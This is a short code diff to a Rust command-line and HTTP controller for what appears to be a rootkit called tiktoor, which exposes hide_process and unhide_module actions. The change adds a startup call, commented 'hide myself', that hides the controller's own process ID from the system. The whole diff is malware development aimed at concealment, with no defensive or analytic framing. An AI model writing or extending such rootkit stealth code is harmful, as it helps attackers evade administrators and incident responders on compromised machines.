@@ -1,5 +1,6 @@
 use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
 use serde::Deserialize;
+use std::process;
 use structopt::StructOpt;
 
 /// A CLI tool for communicating with tiktoor
@@ -39,6 +40,10 @@ async fn unhide_module() -> impl Responder {
 #[actix_web::main]
 async fn main() -> std::io::Result<()> {
     let cli = Cli::from_args();
+
+    // hide myself
+    tiktoor_client::hide_process(process::id());
+
     HttpServer::new(|| {
         App::new()
             .service(hide_process)
